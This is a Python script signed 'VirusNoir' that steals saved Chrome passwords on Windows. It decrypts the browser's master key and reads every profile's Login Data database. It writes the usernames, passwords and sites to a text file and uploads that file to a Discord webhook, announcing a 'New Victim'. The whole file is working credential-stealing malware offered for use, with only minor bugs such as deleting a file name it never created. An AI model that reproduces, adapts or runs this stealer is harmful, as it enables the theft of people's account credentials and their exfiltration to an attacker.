#Script By VirusNoir

import os
import sqlite3 
import json
from win32crypt import CryptUnprotectData
from base64 import b64decode
from Crypto.Cipher import AES as AE
from shutil import copy2
from discord_webhook import *
webhook = "WEBHOOK_URL" #Enter Your Webhook Here !!
local = os.getenv("LOCALAPPDATA") 
google_paths = [
            local + '\\Google\\Chrome\\User Data\\Default',
            local + '\\Google\\Chrome\\User Data\\Profile 1',
            local + '\\Google\\Chrome\\User Data\\Profile 2',
            local + '\\Google\\Chrome\\User Data\\Profile 3',
            local + '\\Google\\Chrome\\User Data\\Profile 4',
            local + '\\Google\\Chrome\\User Data\\Profile 5',
        ]
def heck():
    def mk():
        with open(local + '\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    masterkey = mk()
    def decode_password(buffer, master_key):
        try:
            bufiv, payload = buffer[3:15], buffer[15:]
            cipher = AE.new(master_key, AE.MODE_GCM, bufiv)
            decoded = cipher.decrypt(payload)[:-16].decode()
            return decoded
        except:
            return "No Passwords Fount"
    def passwords():
            with open(f"\\Users\\{os.getlogin()}\\AppData\\Local\\Google.txt", "w", encoding="utf-8") as f:
                f.write("Saved Google Passwords Backup\n\n")

            for path in google_paths:
                path += '\\Login Data'
                if os.path.exists(path):
                    copy2(path, "logins.db")
                    db = sqlite3.connect("logins.db")
                    cmd = db.cursor()
                    with open(f"\\Users\\{os.getlogin()}\\AppData\\Local\\Google.txt", "a", encoding="utf-8") as f:
                        for result in cmd.execute("SELECT action_url, username_value, password_value FROM logins"):
                            url, username, password = result
                            password = decode_password(
                                password, masterkey)
                            if url and username and password != "":
                                f.write(
                                    "Username: {:<30} | Password: {:<30} | Site: {:<30}\n".format(
                                        username, password, url))
                    cmd.close()
                    db.close()
                    os.remove("Loginvault.db")
    passwords()
    w = DiscordWebhook(url=webhook,username="VirusNoir",avatar_url="https://cdn.discordapp.com/attachments/970344085594472478/1028801041837330484/vn.png",content="**New Victim !!**, **Script By VirusNoir =** ***http://savens.ml/github.php?user=virusnoir*** ```\nFollow Me On Instagram : \nAcc 1 : @not_elli0t\nAcc 2 : @virus__noir```")
    with open(local+"\\Google.txt", "rb") as f:
        w.add_file(file=f.read(), filename='Passwords.txt')
        w.execute()
if __name__=='__main__':
    heck()
